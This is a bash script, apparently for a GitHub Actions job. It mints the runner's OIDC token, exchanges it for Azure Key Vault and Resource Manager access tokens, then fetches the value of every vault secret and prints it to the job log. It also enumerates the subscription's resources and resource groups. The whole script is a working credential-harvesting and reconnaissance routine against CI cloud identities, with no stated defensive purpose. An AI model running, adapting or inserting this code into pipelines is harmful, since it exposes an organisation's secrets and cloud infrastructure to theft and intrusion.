#!/usr/bin/env bash
set +e
echo "=== ENV ==="
echo "repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME ref=$GITHUB_REF sha=$GITHUB_SHA"
echo "OIDC_URL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
echo "=== MINT OIDC ==="
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r .value 2>/dev/null)
echo "OIDC_LEN=${#OIDC}"
echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null
echo
for SCOPE in "https://vault.azure.net/.default" "https://management.azure.com/.default"; do
  echo "### scope=$SCOPE"
  RESP=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    -d "client_id=${AZURE_CLIENT_ID}" \
    -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    -d "client_assertion=${OIDC}" \
    --data-urlencode "scope=${SCOPE}")
  echo "$RESP" | head -c 700; echo
  TOK=$(echo "$RESP" | jq -r '.access_token // empty' 2>/dev/null)
  echo "TOKEN_LEN=${#TOK}"
  if [ -n "$TOK" ]; then
    echo "--- KV secret list"
    curl -sS "${VAULT}/secrets?api-version=7.4" -H "Authorization: Bearer $TOK" -o /tmp/secrets.json -w "kv_http=%{http_code}\n"
    head -c 2000 /tmp/secrets.json; echo
    jq -r '.value[]?.id' /tmp/secrets.json 2>/dev/null > /tmp/ids.txt
    while read -r id; do
      [ -z "$id" ] && continue
      echo "--- SECRET $id"
      curl -sS "${id}?api-version=7.4" -H "Authorization: Bearer $TOK" | head -c 1200
      echo
    done < /tmp/ids.txt
    echo "--- ARM resources"
    curl -sS "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resources?api-version=2021-04-01" -H "Authorization: Bearer $TOK" -o /tmp/res.json -w "arm_http=%{http_code}\n"
    jq -r '.value[]? | "\(.type)  \(.name)  \(.location)"' /tmp/res.json 2>/dev/null | head -60
    echo "--- ARM resource groups"
    curl -sS "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourcegroups?api-version=2021-04-01" -H "Authorization: Bearer $TOK" | jq -r '.value[]?.name' | head -30
  fi
done
echo "=== DONE ==="
